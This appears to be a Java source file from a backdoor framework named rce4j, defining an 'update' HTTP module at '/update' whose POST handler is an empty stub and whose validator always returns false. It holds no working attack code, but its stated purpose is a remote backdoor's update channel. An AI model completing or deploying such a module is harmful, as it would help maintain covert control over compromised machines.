package org.rce4j.module.impl.http;

import net.chococaker.jjason.JsonObject;
import org.rce4j.module.BackdoorHttpModule;
import org.rce4j.module.event.BackdoorHttpEvent;

import java.util.function.Predicate;

public class UpdateModule extends BackdoorHttpModule {
    public UpdateModule() {
        super("update", "/update");
    }
    
    @Override
    public void onPost(BackdoorHttpEvent event) { // todo
    
    }
    
    private static class UpdateModuleValidator implements Predicate<JsonObject> {
        @Override
        public boolean test(JsonObject jsonObject) {
            return false;
        }
    }
}
